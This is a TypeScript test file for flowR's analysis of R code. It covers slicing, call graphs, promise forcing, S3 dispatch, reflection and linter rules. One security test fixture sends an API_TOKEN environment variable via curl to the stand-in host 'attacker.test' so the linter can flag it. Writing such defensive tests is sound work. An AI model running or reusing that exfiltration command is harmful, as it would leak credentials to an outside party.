import { assert, describe, test } from 'vitest';
import { withTreeSitter } from '../_helper/shell';
import { decorateLabelContext, label } from '../_helper/label';
import { FlowrAnalyzerBuilder } from '../../../src/project/flowr-analyzer-builder';
import { SlicingCriterion } from '../../../src/slicing/criterion/parse';
import { canReach } from '../../../src/control-flow/simple-visitor';
import { FunctionSemantics } from '../../../src/dataflow/fn/function-semantics';
import { DfEdge, EdgeType } from '../../../src/dataflow/graph/edge';
import { Ternary } from '../../../src/util/logic';
import type { LintingRuleNames } from '../../../src/linter/linter-rules';
import type { CallGraphQuery } from '../../../src/queries/catalog/call-graph-query/call-graph-query-format';

const sec = (s: string) => decorateLabelContext(label(s, ['name-normal', 'function-calls']), ['dataflow']);

describe('Snippets: domains', withTreeSitter(parser => {
	async function analyze(code: string) {
		const analyzer = await new FlowrAnalyzerBuilder().setParser(parser).build();
		analyzer.addRequest(code);
		const { idMap } = await analyzer.normalize();
		return { analyzer, idMap };
	}

	async function sliceOf(code: string, criterion: SlicingCriterion): Promise<string> {
		const { analyzer } = await analyze(code);
		const sliced = await analyzer.query([{ type: 'static-slice', criteria: [criterion] }]);
		return (Object.values(sliced['static-slice'].results)[0] as { reconstruct: { code: string } }).reconstruct.code;
	}

	/** asserts which lines (as substrings) the slice keeps and drops */
	function testSlice(name: string, code: string, criterion: SlicingCriterion, expected: { has?: readonly string[], lacks?: readonly string[] }, fails = false) {
		const run = fails ? test.fails : test;
		run(sec(name), async() => {
			const sliced = await sliceOf(code, criterion);
			for(const s of expected.has ?? []) {
				assert.include(sliced, s, `slice should keep ${s}:\n${sliced}`);
			}
			for(const s of expected.lacks ?? []) {
				assert.notInclude(sliced, s, `slice should drop ${s}:\n${sliced}`);
			}
		});
	}

	/** the ids a call reaches, according to the dataflow graph */
	async function callTargets(code: string, criterion: SlicingCriterion) {
		const { analyzer, idMap } = await analyze(code);
		const graph = (await analyzer.dataflow()).graph;
		const id = SlicingCriterion.parse(criterion, idMap);
		return {
			idMap,
			targets: new Set([...graph.edgesFrom(id)].filter(([, e]) => DfEdge.includesType(e, EdgeType.Calls)).map(([t]) => t))
		};
	}

	function testCalls(name: string, code: string, criterion: SlicingCriterion, expected: { reaches?: readonly SlicingCriterion[], misses?: readonly SlicingCriterion[] }, fails = false) {
		const run = fails ? test.fails : test;
		run(sec(name), async() => {
			const { targets, idMap } = await callTargets(code, criterion);
			for(const r of expected.reaches ?? []) {
				assert.isTrue(targets.has(SlicingCriterion.parse(r, idMap)), `${criterion} should call ${r}`);
			}
			for(const r of expected.misses ?? []) {
				assert.isFalse(targets.has(SlicingCriterion.parse(r, idMap)), `${criterion} should not call ${r}`);
			}
		});
	}

	describe('domains:env', () => {
		const alias = 'e <- new.env()\nf <- e\nassign("x", 1, envir = f)\nprint(get("x", envir = e))';
		testSlice('domains:env write through an alias is seen', alias, '4@print', { has: ['assign("x", 1, envir = f)', 'f <- e'] });
		const distinct = 'e1 <- new.env()\ne2 <- new.env()\nassign("x", 1, envir = e1)\nassign("x", 2, envir = e2)\nprint(get("x", envir = e1))';
		testSlice('domains:env two environments are kept apart', distinct, '5@print', { has: ['assign("x", 1, envir = e1)'], lacks: ['assign("x", 2, envir = e2)'] });
		const overwrite = 'e <- new.env()\nassign("x", 1, envir = e)\nf <- e\nassign("x", 2, envir = f)\nprint(get("x", envir = e))';
		testSlice('domains:env a surely aliased environment is overwritten', overwrite, '5@print', { has: ['assign("x", 2, envir = f)'], lacks: ['assign("x", 1, envir = e)'] }, false);
		const factory = 'mk <- function() { n <- 0; function() { n <<- n + 1; n } }\na <- mk()\nb <- mk()\na()\na()\nprint(b())';
		testSlice('domains:env closures of one factory do not share state', factory, '6@print', { has: ['b <- mk()'], lacks: ['a <- mk()', 'a()'] });
		const counter = (rest: string) => `mk <- function() { n <- 0; function() { n <<- n + 1; n } }\n${rest}`;
		testSlice('domains:env interleaved calls of another closure are not needed', counter('a <- mk()\nb <- mk()\na()\nb()\nprint(a())'), '6@print', { has: ['\na()'], lacks: ['b <- mk()', 'b()'] });
		testSlice('domains:env an alias of a closure shares its state', counter('a <- mk()\nb <- a\na()\nprint(b())'), '5@print', { has: ['\na()'] });
		testSlice('domains:env a closure created in a loop shares state with its later calls', counter('for(i in 1:2) {\n  a <- mk()\n  a()\n}\nprint(a())'), '6@print', { has: ['a()\n'] });
		testSlice('domains:env closures stored in a list keep their calls', counter('cs <- lapply(1:2, function(i) mk())\ncs[[1]]()\nprint(cs[[1]]())'), '4@print', { has: ['cs[[1]])()'] });
		testSlice('domains:env a closure called through a function keeps that call', counter('g <- function() a()\na <- mk()\nb <- mk()\ng()\nprint(a())'), '6@print', { has: ['g()'] });
		testSlice('domains:env a closure of a global counter shares state', 'mk <- function() function() { n <<- n + 1; n }\nn <- 0\na <- mk()\nb <- mk()\na()\nprint(b())', '6@print', { has: ['\na()'] });
	});

	describe('domains:promise', () => {
		const strictOf = async(code: string, fn: SlicingCriterion) => {
			const { analyzer, idMap } = await analyze(code);
			const id = SlicingCriterion.parse(fn, idMap);
			const strictness = FunctionSemantics.strictness([id], (await analyzer.dataflow()).graph, { ctx: analyzer.inspectContext() })[id];
			const byName = (p: string) => Object.entries(strictness.parameters).find(([k]) => idMap.get(Number(k))?.lexeme === p)?.[1];
			return { a: byName('a'), b: byName('b') };
		};

		test(sec('domains:promise a branch on a constant forces only one argument'), async() => {
			const r = await strictOf('f <- function(a, b) if(TRUE) a else b', '1@function');
			assert.deepEqual(r, { a: Ternary.Always, b: Ternary.Never });
		});
		test(sec('domains:promise a branch on a global constant forces only one argument'), async() => {
			const r = await strictOf('note <- function(x) {\n  cat("used\\n")\n  x\n}\ncond <- TRUE\nf <- function(a, b) if(cond) a else b\nf(note(1), note(2))', '6@function');
			assert.deepEqual(r, { a: Ternary.Always, b: Ternary.Never });
		});
		test(sec('domains:promise a branch on an unknown global may force either'), async() => {
			const r = await strictOf('f <- function(a, b) if(cond) a else b', '1@function');
			assert.deepEqual(r, { a: Ternary.Maybe, b: Ternary.Maybe });
		});
		/** whether control reaches the marker `print` (the last statement of `h`) from the program start */
		async function reaches(code: string, marker: SlicingCriterion): Promise<boolean> {
			const { analyzer, idMap } = await analyze(code);
			const cfg = await analyzer.controlflow(undefined, true);
			return canReach(cfg.graph, cfg.entryPoints, SlicingCriterion.parse(marker, idMap));
		}
		function testReturn(name: string, code: string, marker: SlicingCriterion, expected: boolean, fails = false) {
			(fails ? test.fails : test)(sec(`domains:promise ${name}`), async() => {
				assert.strictEqual(await reaches(code, marker), expected);
			});
		}
		testReturn('a return in a forced argument leaves the caller', 'g <- function(x) { x; 1 }\nh <- function() { g(return(5)); print("dead") }', '2@print', false);
		testReturn('a return in an argument forced by force() leaves the caller', 'g <- function(x) { force(x); 1 }\nh <- function() { g(return(5)); print("dead") }', '2@print', false);
		testReturn('a return in an argument the callee never forces is skipped', 'g <- function(x) 1\nh <- function() { g(return(5)); print("alive") }', '2@print', true);
		testReturn('a return in an argument the callee may force may be skipped', 'g <- function(x) { if(runif(1) > 0.5) x; 1 }\nh <- function() { g(return(5)); print("maybe") }', '2@print', true);
		testReturn('a return in a default argument leaves only the callee', 'h <- function() { f <- function(x = return(7)) { x; 3 }; f(); print(2) }', '1@print', true);
		testReturn('a return in a default argument nobody forces is skipped', 'h <- function() { f <- function(x = return(7)) 3; f(); print(2) }', '1@print', true);
		testReturn('code after a plain return is dead', 'h <- function() { return(5); print(2) }', '1@print', false);
	});

	describe('domains:dispatch', () => {
		const temp = 'print.temp <- function(x, ...) cat(x, "degrees\\n")\nx <- structure(21, class = "temp")\nprint(x)';
		testCalls('domains:dispatch print reaches the method of the class', temp, '3@print', { reaches: ['1@function'] });
		const vec = 'print.temp <- function(x, ...) cat(x, "degrees\\n")\nx <- structure(21, class = c("celsius", "temp"))\nprint(x)';
		testCalls('domains:dispatch a later class of the vector is reached', vec, '3@print', { reaches: ['1@function'] });
		const both = 'print.temp <- function(x, ...) cat("t\\n")\nprint.celsius <- function(x, ...) cat("c\\n")\nx <- structure(21, class = c("celsius", "temp"))\nprint(x)';
		testCalls('domains:dispatch the first class wins', both, '4@print', { reaches: ['2@function'], misses: ['1@function'] });
		const other = 'print.temp <- function(x, ...) cat("t\\n")\nx <- structure(21, class = "other")\nprint(x)';
		testCalls('domains:dispatch an unrelated class does not reach the method', other, '3@print', { misses: ['1@function'] });
		const next = 'print.temp <- function(x, ...) cat("t\\n")\nprint.celsius <- function(x, ...) NextMethod()\nx <- structure(21, class = c("celsius", "temp"))\nprint(x)';
		testCalls('domains:dispatch NextMethod reaches the later class', next, '4@print', { reaches: ['1@function', '2@function'] });
		const replaced = 'print.temp <- function(x, ...) cat("t\\n")\nx <- "a"\nclass(x) <- "temp"\nprint(x)';
		testCalls('domains:dispatch a class set by replacement reaches the method', replaced, '4@print', { reaches: ['1@function'] });
		const two = 'print.temp <- function(x, ...) cat("t\\n")\nprint.other <- function(x, ...) cat("o\\n")\n';
		testCalls('domains:dispatch a named extra argument keeps the dispatch', two + 'x <- structure(21, class = "temp")\nprint(x, digits = 2)', '4@print', { reaches: ['1@function'], misses: ['2@function'] });
		testCalls('domains:dispatch on the argument bound to the first formal', two + 'x <- structure(21, class = "temp")\nprint(digits = 2, x)', '4@print', { reaches: ['1@function'], misses: ['2@function'] });
		testCalls('domains:dispatch on a class known inside a function', two + 'f <- function() {\n  x <- structure(21, class = "temp")\n  print(x)\n}\nf()', '5@print', { reaches: ['1@function'], misses: ['2@function'] });
		testCalls('domains:dispatch a free variable sees its later value', two + 'x <- structure(1, class = "temp")\nf <- function() print(x)\nx <- structure(1, class = "other")\nf()', '4@print', { reaches: ['2@function'] });
		testCalls('domains:dispatch a primitive dispatches on its first argument given', 'rep.a <- function(x, ...) "a"\nrep.b <- function(x, ...) "b"\nx <- structure(1, class = "a")\ny <- structure(1, class = "b")\nrep(times = y, x)', '5@rep', { reaches: ['2@function'] });
		testCalls('domains:dispatch a binary operator dispatches on either operand', '`+.b` <- function(e1, e2) "b"\n`+.a` <- function(e1, e2) "a"\nx <- 1\ny <- structure(1, class = "b")\nx + y', '5@+', { reaches: ['1@function'] });
	});

	describe('domains:hof', () => {
		const adder = 'adder <- function(n) function(x) x + n\nadd1 <- adder(1)\nr <- Reduce(`+`, lapply(1:3, add1))\nprint(r)';
		testSlice('domains:hof the closure argument and its factory call are kept', adder, '4@print', { has: ['adder <- function(n) function(x) x + n', 'add1 <- adder(1)', 'lapply(1:3, add1)'] });
		testSlice('domains:hof a second closure of the factory is not needed', 'adder <- function(n) function(x) x + n\nadd1 <- adder(1)\nadd2 <- adder(2)\nprint(add1(5))', '4@print', { has: ['add1 <- adder(1)'], lacks: ['add2'] });
		testSlice('domains:hof the promise of the factory argument sees the later value', 'adder <- function(n) function(x) x + n\nk <- 1\nadd <- adder(k)\nk <- 100\nprint(add(1))', '5@print', { has: ['k <- 100', 'add <- adder(k)'] });
		testSlice('domains:hof the promise of the factory argument does not see the overwritten value', 'adder <- function(n) function(x) x + n\nk <- 1\nadd <- adder(k)\nk <- 100\nprint(add(1))', '5@print', { lacks: ['k <- 1\n'] });
		const factoryOf = (between: string, use = 'print(add(1))') => `adder <- function(n) function(x) x + n\nk <- 1\nadd <- adder(k)\n${between}\n${use}`;
		testSlice('domains:hof a promise forced before the overwrite keeps the old value', factoryOf('add(1)\nk <- 100'), '6@print', { has: ['k <- 1\n'] });
		testSlice('domains:hof a conditional overwrite keeps the old value', factoryOf('if(runif(1) > 2) k <- 100'), '5@print', { has: ['k <- 1\n'] });
		testSlice('domains:hof a closure called through an earlier function stays conservative', factoryOf('g <- function() add(1)\nk <- 100', 'print(g())'), '6@print', { has: ['k <- 1\n'] });
		testSlice('domains:hof a closure aliased before the overwrite stays conservative', factoryOf('h <- add\nk <- 100', 'print(h(1))'), '6@print', { has: ['k <- 1\n'] });

		test(sec('domains:hof a closure handed to lapply is reachable'), async() => {
			const { analyzer, idMap } = await analyze(adder);
			const query: CallGraphQuery = { type: 'call-graph', reportUnreachable: true };
			const unreachable = new Set((await analyzer.query([query]))['call-graph'].unreachable);
			assert.isFalse(unreachable.has(SlicingCriterion.parse('1:22', idMap)), 'inner function');
		});
	});

	describe('domains:reflection', () => {
		const plus = 'assign("+", function(a, b) a - b)\n2 + 3';
		testCalls('domains:reflection a rebound plus calls the new function', plus, '2@+', { reaches: ['1@function'] });
		testSlice('domains:reflection the rebinding is part of the slice', plus, '2@+', { has: ['assign("+"'] });
		testSlice('domains:reflection an unrelated rebinding is not', 'assign("-", function(a, b) a + b)\n2 + 3', '2@+', { lacks: ['assign'] });
		testSlice('domains:reflection a rebinding through eval is part of the slice', 'eval(parse(text = "`+` <- function(a, b) a - b"))\n2 + 3', '2@+', { has: ['eval(parse'] });
		testSlice('domains:reflection body replacement is part of the slice', 'f <- function(a, b) a + b\nbody(f) <- quote(a - b)\nf(2, 3)', '3@f', { has: ['body(f) <- quote(a - b)'] });
		testSlice('domains:reflection a rebinding in a function body stays there', 'g <- function() {\n  assign("+", function(a, b) a - b)\n  2 + 3\n}\nprint(2 + 3)', '5@print', { lacks: ['assign'] });
	});

	/** the lint results of `rule` for `code`, as the line each one starts at */
	async function lintedLines(code: string, rule: LintingRuleNames): Promise<number[]> {
		const { analyzer } = await analyze(code);
		const linted = await analyzer.query([{ type: 'linter', rules: [rule] }]);
		const results = (linted.linter.results[rule] as unknown as { results?: { loc: readonly number[] }[] } | undefined)?.results ?? [];
		return results.map(r => r.loc[0]);
	}

	function testLint(name: string, code: string, rule: LintingRuleNames, lines: readonly number[]) {
		test(sec(name), async() => {
			assert.deepStrictEqual(await lintedLines(code, rule), lines, `${rule} should report the lines ${JSON.stringify(lines)}`);
		});
	}

	describe('domains: the other snippets', () => {
		testSlice('vector: the length bound is part of the slice', 'n <- 4L\nx <- 1:n\nprint(x)', '3@print', { has: ['n <- 4L'] });
		const attr = 'x <- 1:6\ndim(x) <- c(2, 3)\nclass(x) <- "myclass"\ne <- structure(1:6, dim = c(2, 3), class = "myclass")\nprint(dim(x))\nprint(e)';
		testSlice('attr: the replacement sets the attribute', attr, '5@print', { has: ['x <- 1 : 6', 'dim(x) <- c(2, 3)'], lacks: ['structure'] });
		testSlice('attr: structure sets them in one call', attr, '6@print', { has: ['structure'], lacks: ['dim(x) <-', 'class(x) <-'] });
		const shape = 'df <- data.frame(id = 2:3, points = c(4, 6))\nscore <- 42\nwith(df, {\n  print(score)\n})';
		testSlice('shape: a name in with may be a column or the variable', shape, '4@print', { has: ['df <- data.frame', 'score <- 42'] });
		const matrix = 'm <- matrix(1:6, nrow = 2)\nr <- t(m) %*% m\nprint(r)';
		testSlice('matrix: the product reads the matrix', matrix, '3@print', { has: ['m <- matrix(1:6, nrow = 2)'] });
		testLint('matrix: constant data is no file', matrix, 'file-path-validity', []);
		testSlice('order: a cell run again reads the run before', 'x <- 1\nx <- x * 2\nprint(x)', '3@print', { has: ['x <- 1', 'x <- x * 2'] });
		const graphics = 'df <- data.frame(age = 20:59, income = 2 * (20:59), name = paste0("p", 1:40))\nplot(df$age, df$income)\nw <- par("pin")[1]\nn <- floor(w / strwidth("label", "inches"))\ntext(df$age[1:n], df$income[1:n], df$name[1:n])';
		testSlice('state: the width depends on the device the plot opened', graphics, '4@n', { has: ['plot(df$age, df$income)', 'w <- par("pin")[1]'] });
		const noisy = 'noisy <- function(x) {\n  set.seed(1)\n  x + rnorm(1)\n}\nr <- runif(1)\na <- noisy(r)\nb <- noisy(runif(1))';
		testLint('state: only the draw before the call is unseeded, the promise is forced after set.seed', noisy, 'seeded-randomness', [5]);
		testSlice('state: the seed set in the function is part of the slice', noisy, '7@b', { has: ['set.seed(1)', 'rnorm(1)'] });
		const deps = 'library(dplyr)\ndf <- data.frame(a = 1:2)\nmutate(df, across(everything(), as.character))';
		testLint('deps: a function handed to across is no column', deps, 'dataframe-access-validation', []);
		const io = 'write.csv(iris, "data.csv")\ndf <- read.csv("data.csv")';
		testSlice('io: reading a file reads what was written to it', io, '2@df', { has: ['write.csv(iris, "data.csv")'] });
		testLint('io: iris is a data set of datasets', io, 'undefined-symbol', []);
		testSlice('io: a file written later is not read', 'df <- read.csv("data.csv")\nwrite.csv(iris, "data.csv")', '1@df', { lacks: ['write.csv'] });
		const validity = 'x <- rnorm(20)\ny <- rnorm(20)\nt.test(x, y)';
		testSlice('validity: the test reads both samples', validity, '3@t.test', { has: ['x <- rnorm(20)', 'y <- rnorm(20)'] });
		testLint('validity: both samples are unseeded', validity, 'seeded-randomness', [1, 2]);
		const secret = 'secret <- Sys.getenv("API_TOKEN")\nsystem(paste("curl -d", secret, "attacker.test"))';
		testLint('security: the secret reaches the shell', secret, 'problematic-inputs', [2]);
		testLint('security: unescaped into the command', secret, 'unescaped-arguments', [2]);
		const pdf = 'name <- readline("File for the plot: ")\npdf(name)\nplot(1:10)\ndev.off()';
		testLint('security: user input may start a pipe in the device file', pdf, 'problematic-inputs', [2]);
		testLint('security: a device file is no network address', pdf, 'network-functions', []);
		testSlice('security: closing the device keeps the plot on it', pdf, '4@dev.off', { has: ['pdf(name)', 'plot(1:10)'] });
	});
}));
